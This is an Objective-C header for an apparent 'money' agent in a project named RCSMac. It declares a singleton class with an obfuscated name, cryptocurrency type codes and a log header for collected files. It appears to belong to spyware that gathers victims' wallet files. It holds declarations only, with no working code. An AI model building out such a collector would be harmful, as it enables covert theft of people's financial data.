//
//  RCSMAgentMoney.h
//  RCSMac
//
//  Created by Monkey Mac on 10/8/14.
//
//

#ifndef __RCSMAgentMoney_h__
#define __RCSMAgentMoney_h__

#import <Foundation/Foundation.h>
#import "RCSMLogManager.h"


#define MONEY_VERSION  2014010101
#define BITCOIN_TYPE  0x00
#define LITECOIN_TYPE  0x30
#define FEATHERCOIN_TYPE  0x0E
#define NAMECOIN_TYPE  0x34
#define MONEY_PROGRAM_TYPE  0x00000000


typedef struct _moneyAdditionalHeader{
    u_int32_t version;
    u_int32_t moneyType;
    u_int32_t programType;
    u_int32_t filenameLen;
} moneyAdditionalHeader;



#define MARKUP_KEY @"date"

@interface __m_MAgentMoney : NSObject <__m_Agents>
{
@private
    NSMutableDictionary *mConfiguration;
    //NSMutableDictionary *markup;
    //NSString *markupFile;
}

+ (__m_MAgentMoney *)sharedInstance;
- (id)copyWithZone: (NSZone *)aZone;
+ (id)allocWithZone: (NSZone *)aZone;

- (void)release;
- (id)autorelease;
- (id)retain;
- (unsigned)retainCount;

- (NSMutableDictionary *)mConfiguration;
- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration;

@end

#endif
